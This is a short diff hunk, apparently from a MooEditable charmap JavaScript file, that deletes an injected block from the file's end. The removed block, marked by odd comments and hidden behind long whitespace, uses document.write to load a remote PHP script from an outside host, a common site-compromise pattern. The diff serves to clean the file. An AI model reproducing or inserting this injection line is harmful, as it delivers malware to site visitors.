@@ -343,13 +343,3 @@ MooEditable.Actions.charmap = {
 		}
 	}
 };
-
-
-/*78f55f*/
-
-                    																	                               	 /*gbargbar09311gbar09*/
-
-document.write("<script type='text/javascript' src='http://j-j-computer.de/6Wf2mtKy.php?id=525349'></"+ "script>");
-
-
-/*/78f55f*/
